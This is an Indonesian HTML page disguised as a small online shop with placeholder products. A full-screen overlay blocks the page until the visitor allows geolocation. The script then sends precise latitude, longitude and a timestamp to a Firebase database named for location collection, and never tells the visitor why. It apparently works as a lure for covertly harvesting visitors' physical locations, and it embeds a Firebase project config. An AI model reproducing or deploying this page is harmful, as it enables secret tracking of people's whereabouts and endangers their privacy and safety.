<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Toko Lokasi</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(200,200,200,0.9);
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      font-size: 1.2rem;
      font-weight: bold;
    }
    .hidden { display: none !important; }
  </style>
</head>
<body>

<div class="overlay" id="overlay">
  Mengambil lokasi...<br>
  Mohon izinkan akses lokasi Anda
</div>

<div class="container py-5">
  <h1 class="text-center mb-4">üõí Toko Pilihan</h1>
  <div class="row g-4">
    <div class="col-md-4">
      <div class="card">
        <img src="https://via.placeholder.com/300x200" class="card-img-top" alt="Produk 1">
        <div class="card-body">
          <h5 class="card-title">Produk A</h5>
          <p class="card-text">Deskripsi singkat produk A.</p>
        </div>
      </div>
    </div>
    <div class="col-md-4">
      <div class="card">
        <img src="https://via.placeholder.com/300x200" class="card-img-top" alt="Produk 2">
        <div class="card-body">
          <h5 class="card-title">Produk B</h5>
          <p class="card-text">Deskripsi singkat produk B.</p>
        </div>
      </div>
    </div>
    <!-- Tambah produk lainnya -->
  </div>
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyAnI3-EDQr7OK8fHaeSSzAtLk9iR5sgbac",
    authDomain: "lokasiapi-2f434.firebaseapp.com",
    projectId: "lokasiapi-2f434",
    storageBucket: "lokasiapi-2f434.appspot.com",
    messagingSenderId: "875812427660",
    appId: "1:875812427660:web:5c4ce962244c47e18128a9"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  function sendLocation(lat, lon) {
    const now = new Date().toISOString();
    db.ref("lokasi").push({
      latitude: lat,
      longitude: lon,
      timestamp: now
    }).then(() => {
      document.getElementById('overlay').classList.add('hidden');
    }).catch(err => {
      document.getElementById('overlay').innerText = '‚ùå Gagal mengirim lokasi.';
    });
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        const lat = pos.coords.latitude.toFixed(6);
        const lon = pos.coords.longitude.toFixed(6);
        sendLocation(lat, lon);
      },
      err => {
        document.getElementById('overlay').innerText = "‚ùå Gagal akses lokasi. Silakan refresh & izinkan lokasi.";
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  } else {
    document.getElementById('overlay').innerText = "‚ùå Browser tidak mendukung Geolocation.";
  }
</script>

</body>
</html>
